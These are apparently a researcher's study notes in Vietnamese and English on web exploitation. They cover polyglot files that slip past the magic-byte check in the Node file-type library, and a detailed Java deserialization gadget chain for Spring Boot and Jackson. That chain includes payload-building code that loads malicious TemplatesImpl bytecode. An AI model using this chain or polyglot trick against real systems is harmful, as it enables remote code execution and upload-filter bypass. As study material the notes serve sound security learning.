## 1. Giải Mã Tệp Polyglot [chi tiết](https://blog.voorivex.team/usual-suspect-type-confusion-in-twelve-bytes)

What are polyglots? [chi tiết](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- Polyglots, in a security context, are files that are a valid form of multiple different file types.For example, a GIFAR is both a GIF and a RAR file. There are also files out there that can be both GIF and JS, both PPT and JS, etc.
- Polyglot files are often used to bypass protection based on file types. Many applications that allow users to upload files only allow uploads of certain types, such as JPEG, GIF, DOC, so as to prevent users from uploading potentially dangerous files like JS files, PHP files or Phar files.

what is ISO Base Media File Format?
- Là một standard format cho các file phương tiện (media) như MP4, MOV, HEIC, AVIF, … Định dạng của nó có thể hiểu là các box tuần tự: Every box begins with a 4-byte size, a 4-byte type, and then its payload:
![](image/2026-09-13-17-43-41.png)

thư viện file-type of node version 16.5.4
```
// File Type Box (ISO base media file format)
if (
    checkString('ftyp', {offset: 4}) &&// kiểm tra từ byte thứ 4 , check type of box
    (buffer[8] & 0x60) !== 0x00 // Brand major, first character ASCII?
) {
    const brandMajor = buffer.toString('binary', 8, 12).replace('\0', ' ').trim();
    switch (brandMajor) {
        case 'avif':              return {ext: 'avif', mime: 'image/avif'};
        case 'mif1':              return {ext: 'heic', mime: 'image/heif'};
        case 'heic': case 'heix': return {ext: 'heic', mime: 'image/heic'};
        // ...
    }
}
```
đoạn code trên bỏ qua hoàn toàn các byte 0->3 . Box size hoàn toàn bị bỏ qua

![](image/2026-09-13-18-59-43.png)
Ý tưởng:
- chèn kí tự commnet vào phần size box và payload box. Đặc biệt nguy hiểm khi xả ra case phía BE sử dụng kiểm tra loại file sơ sài (Shallow Sniffing) nhưng khi trả ngược lại về người dùng thì lại set content-type dựa vào extension. 

### ý nghĩa:
- type file không phải là tĩnh mà nó được định nghĩa
- Các thư viện quét nhanh như file-type ra đời để tối ưu hiệu năng (chỉ đọc vài byte đầu để đoán định dạng), hoàn toàn không phải là bộ phân tích cấu trúc tệp (parser) chuyên sâu. Dùng chúng như lớp phòng thủ cốt lõi để quyết định tệp có an toàn hay không là một sai lầm chết người.

## 2. Serialization và Deserialization , Deserialization Gadget Chain on JDK 17/21/25 and Spring Boot 3.2.x-4.0.5
```java
// Users.java
import java.io.Serializable;

public class Users implements Serializable {
    public String name;
    public int age;

    public Users(String name, int age) {
        this.name = name;
        this.age = age;
    }
}
```
```java
// Test.java
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class Test {
    public static void main(String[] args) throws IOException {
        String filename = "user.ser";
        Users userToSave = new Users("duc", 19);
        System.out.println("User Name: " + userToSave.name);
        System.out.println("User Age: " + userToSave.age);
        try (FileOutputStream fileOut = new FileOutputStream(filename);
                ObjectOutputStream objectOut = new ObjectOutputStream(fileOut)) {
            objectOut.writeObject(userToSave);
            System.out.println("\nDa serialize vao file : " + filename);
        }

        // Deserialize
        try (FileInputStream fileIn = new FileInputStream(filename);
                ObjectInputStream objectIn = new ObjectInputStream(fileIn)) {
            Users userFromFile = (Users) objectIn.readObject();
            System.out.println("\nDa deserialize tu file : " + filename);
            System.out.println("Name: " + userFromFile.name);
            System.out.println("Age: " + userFromFile.age);
        } catch (IOException | ClassNotFoundException e) {
            e.printStackTrace();
        }
    }
}
```

Trong đoạn code trên thì nó dùng `ObjectOutputStream.writeObject()` để serialize và ghi data vào file. Còn `ObjectInputStream.readObject()` là để Deserialize
Khi Deserialize , java sẽ kiểm tra xem class có định nghĩa `readObject` method hay không , nếu có thì gọi nó trước. 

### Xây dựng Gadget Chain 
1. HashMap.readObject()

Trong HashMap có xây dựng một custom `readObject()` method . Khi 2 key trong 1 HashMap xung đột (giá trị hashCode() trả về giống nhau) thì chúng sẽ gọi `key1.equals(key2)`
```java
//code trong readObject() method
for (int i = 0; i < mappings; i++) {
    K key = (K) s.readObject();      // Reconstruct key from the byte stream
    V value = (V) s.readObject();    // Reconstruct value from the byte stream
    putVal(hash(key), key, value, false, false);  // ← The chain starts here
}
```
Trước khi đặt cặp key-value vào table thì sẽ chạy `hash(key)` trước
```java
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
```
Chúng ta xây dựng 2 key:
- key1 = HotSwappableTargetSource(target = POJONode) - inserted first
- key2 = HotSwappableTargetSource(target = XString) - inserted second
cuối cùng sẽ gọi: `HotSwappableTargetSource(XString).equals(HotSwappableTargetSource(POJONode))`

Mục dích hướng đến equals vì: thường ở trong mỗi class đều triển khai nó khi so sánh hai đối tượng ---> gọi setter , getter , tương tác với class khác ,.....

2. Hash Collision - HotSwappableTargetSource.hashCode()

Thông thường thì an object’s hashCode() depends on its internal state
```java
"hello".hashCode()
"world".hashCode()
-> different strings produce different hashes
```
Nhưng mà  `HotSwappableTargetSource().hashCode()` thì lại luôn trả về `HotSwappableTargetSource.class.hashCode()`
```java
new HotSwappableTargetSource(POJONode).hashCode()
new HotSwappableTargetSource(XString).hashCode()
new HotSwappableTargetSource("dummy").hashCode()
```

Lý do chọn class `HotSwappableTargetSource`:
- It implements Serializable.
- Its hashCode() is cố định
- Its equals() delegates to target.equals(…).

3. HotSwappableTargetSource.equals() → XString.equals(POJONode)

`HotSwappableTargetSource.equals(Objetc target)`:
 ```java
 @Override
public boolean equals(@Nullable Object other) {
    return (this == other || (other instanceof HotSwappableTargetSource that &&
            this.target.equals(that.target)));
            // this.target = XString
            // that.target = POJONode
            // XString.equals(POJONode)
}
 ```       
`XString.equals`:
```java
public boolean equals(Object obj2)
{
    if (null == obj2)
        return false;
    else if (obj2 instanceof XNodeSet)
        return obj2.equals(this);
    else if (obj2 instanceof XNumber)
        return obj2.equals(this);
    else
        return str().equals(obj2.toString());
    // cuối cùng gọi  str().equals(POJONode.toString());
}
```
follow hiện tại:
```
<actual call flow>
HotSwappableTargetSource.equals()
  → this.target.equals(that.target)
  → XString.equals(POJONode)
    → obj2.toString()
    → POJONode.toString()
```

4. POJONode.toString() → Jackson serialize → proxy.getOutputProperties()

`POJONode` Không có method `toString()` nên sẽ gọi  `BaseJsonNode.toString()`.
```java
// BaseJsonNode.java
@Override
public String toString() {
    return InternalNodeMapper.nodeToString(this);
}



// InternalNodeMapper.java
public static String nodeToString(JsonNode n) {
    try {
        return STD_WRITER.writeValueAsString(n);
    } catch (IOException e) {
        throw new RuntimeException(e);
    }
}
```
`STD_WRITER.writeValueAsString()` thực hiện `Jackson serialization` . Ở đây n là `POJONode` , lệnh `STD_WRITER.writeValueAsString(n)` thực hiện việc serialize đối tượng `POJONode` thành chuỗi `JSON`.
```
POJONode.toString() -----> POJONode.serialize()
```

```java
// POJONode.java
public class POJONode extends ValueNode {
    protected Object _value; // Khai báo thuộc tính _value

    // Đây là Constructor (hàm khởi tạo)
    public POJONode(Object value) {
        this._value = value; // Giá trị truyền vào (chính là proxy) được gán vào _value ở đây!
    }
}

@Override
public final void serialize(JsonGenerator gen, SerializerProvider ctxt) throws IOException
{
    if (_value == null) {
        ctxt.defaultSerializeNull(gen);
    } else if (_value instanceof JsonSerializable) {
        ((JsonSerializable) _value).serialize(gen, ctxt);
    } else {
        ctxt.defaultSerializeValue(_value, gen);
    }
}
```
`_value` chính là thứ sẽ được deserialize  hơn nữa `_value` là proterties của class `POJONode.java` nên có thể controll được thông qua contructor.

Bây giờ cần xây dựng  `_value` là Proxy(Templates) object .
```java
TemplatesImpl t = new TemplatesImpl();
// thiết lập mã độc ở đây. 
setField(t, "_bytecodes", new byte[][]{makeEvil("/tmp/PWNED_AUTO.txt")});
setField(t, "_name", "die.verwandlung.Auto");
setField(t, "_tfactory", new TransformerFactoryImpl());
setField(t, "_class", null);

SingletonTargetSource sts = new SingletonTargetSource(t);
AdvisedSupport advised = new AdvisedSupport();
advised.setTargetSource(sts);
advised.setInterfaces(Templates.class);

Constructor<?> ctor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy")
    .getDeclaredConstructor(AdvisedSupport.class);
ctor.setAccessible(true);

Templates proxy = (Templates) Proxy.newProxyInstance(
    Templates.class.getClassLoader(),
    new Class[]{Templates.class, Serializable.class},
    (InvocationHandler) ctor.newInstance(advised));
```
When Jackson calls defaultSerializeValue(_value, gen), it treats _value as a normal Java bean and looks for getters to serialize as properties. Jackson’s BeanPropertyWriter actually invokes getters reflectively as follows:

Tận dụng cơ chế tự động tìm kiếm getter của Jackson để bóp cò lệnh `proxy.getOutputProperties()`.
```java
// BeanPropertyWriter.java
final Object value = (_accessorMethod == null) ? _field.get(bean)
        : _accessorMethod.invoke(bean, (Object[]) null);
```

Chain:
```
XString.equals(POJONode)
  → POJONode.toString()
    → BaseJsonNode.toString()
      → InternalNodeMapper.nodeToString()
        → ObjectWriter.writeValueAsString()
          → POJONode.serialize()
            → ctxt.defaultSerializeValue(_value, gen)
              → Jackson serializes _value = Proxy(Templates) as a bean
              → getter discovery
              → proxy.getOutputProperties() is called
```

#### Lý do chọn Proxy bọc ngoài TemplatesImpl
- Bypass JPMS (Java Module System) vì từ JDK 9+ các class/interface nội bộ sẽ bị khóa chặt.
- Sử dụng Proxy object bọc ngoài:
    - class Proxy được  implement interface java.io.Serializable.
    - Có cơ chế `Invocation Forwarding` / `Dispatcher` để khi Jackson gọi getter trên class bọc ngoài, class đó phải có logic ngầm để chuyển hướng lời gọi đó vào TemplatesImpl nằm bên trong.
    - có ClassPath (class đó có nằm trong thư viện mà dự án sử dụng)


`proxy.getOutputProperties() ----> InvocationHandler`. 
```
InvocationHandler.invoke(proxy, method=getOutputProperties, args=null)
```
InvocationHandler là một interface trong java. Do lúc cấu trúc trước đó (xây dựng payload) thì  `JdkDynamicAopProxy` element `InvocationHandler` nên `InvocationHandler.invoke` = `JdkDynamicAopProxy.invoke`

5.JdkDynamicAopProxy.invoke()
```java
// JdkDynamicAopProxy.java
//phần 1 , 6 là quan trọng. 

// 1. Lấy ra đối tượng TemplatesImpl mang mã độc
target = targetSource.getTarget(); 

// 2. Lấy ra kiểu Class của đối tượng đó (TemplatesImpl.class)
Class<?> targetClass = (target != null ? target.getClass() : null);

// 3. Quét xem có bộ lọc AOP nào không
List<Object> chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);

// 4. Kiểm tra xem danh sách bộ lọc có trống không
if (chain.isEmpty()) {
    // 5. Chuẩn bị tham số (với getOutputProperties thì không có tham số)
    Object[] argsToUse = AopProxyUtils.adaptArgumentsIfNecessary(method, args);
    
    // 6. Dùng Reflection gọi phương thức getOutputProperties() lên đối tượng TemplatesImpl
    retVal = AopUtils.invokeJoinpointUsingReflection(target, method, argsToUse);
}
```

`targetSource.getTarget()` được gọi  thì sẽ gọi `SingletonTargetSource.getTarget()`
```java
// SingletonTargetSource.java
private final Object target;

public SingletonTargetSource(Object target) {
    this.target = target;
}

@Override
public Object getTarget() {
    return this.target;
}
```
`AopUtils.invokeJoinpointUsingReflection()`:
```java
// AopUtils.java
public static Object invokeJoinpointUsingReflection(@Nullable Object target, Method method, Object[] args)
        throws Throwable {
    // method = Templates.getOutputProperties()
    // target = TemplatesImpl
    ReflectionUtils.makeAccessible(method);
    return method.invoke(target, args);

    // trả về TemplatesImpl.getOutputProperties() vì TemplatesImpl implements Templates, Serializable
}
```
The flow can be summarized as:
```
proxy.getOutputProperties()
  → JdkDynamicAopProxy.invoke()
    → this.advised.targetSource
    → SingletonTargetSource.getTarget()
    → target = TemplatesImpl
    → AopUtils.invokeJoinpointUsingReflection()
      → method.invoke(TemplatesImpl)
        → TemplatesImpl.getOutputProperties()
```























































## 3. Một sô chú ý khi có thể chưa biết
1. Một số request header có thể được sử dụng ở trong middleware
- `Sec-Fetch-Site`: Xuất hiện trong hầu như mọi HTTP request mà trình duyệt hiện đại gửi đi (bao gồm tải ảnh, file script, css, iframe, lệnh fetch(), XMLHttpRequest, chuyển trang, form submit,...).
- `Sec-Fetch-User: ?1`
    - Request là một hành vi điều hướng toàn trang:
        - Tức là request đó làm tải lại hoặc chuyển toàn bộ trang web sang URL mới (như bấm vào thẻ `<a>`, submit `<form>`, hoặc redirect trang).
        - Các request chạy ngầm trong nền như `fetch()`, `XMLHttpRequest`, tải ảnh qua `<img>`, tải script qua `<script>` **không bao giờ có header này**.
    - Phải có sự tương tác chủ động của người dùng thật (User Activation).
        - Người dùng phải trực tiếp dùng tay click chuột, chạm màn hình cảm ứng, hoặc bấm phím để kích hoạt hành động đó.
        - Nếu một hành vi chuyển trang do mã JavaScript tự ý gọi (ví dụ: `window.location.href = '...'` hoặc `document.forms[0].submit()` chạy ngầm mà không gắn liền với một sự kiện click của người dùng), trình duyệt sẽ không đính kèm header này (hoặc giá trị Sec-Fetch-User sẽ bị bỏ qua/undefined). Khi có tương tác người dùng hợp lệ, giá trị của nó luôn là ?1.
        













































































2. Cách trình duyệt tự động xác định nội dung là text/html
Trình duyệt tự động xác định dựa vào signature như:
```

<!DOCTYPE html>
<html>	
<head>
<script>
<iframe>
<h1>
<div>
<font>
<table>
<a>
<style>
<title>
<body>
<br>
<!-->
```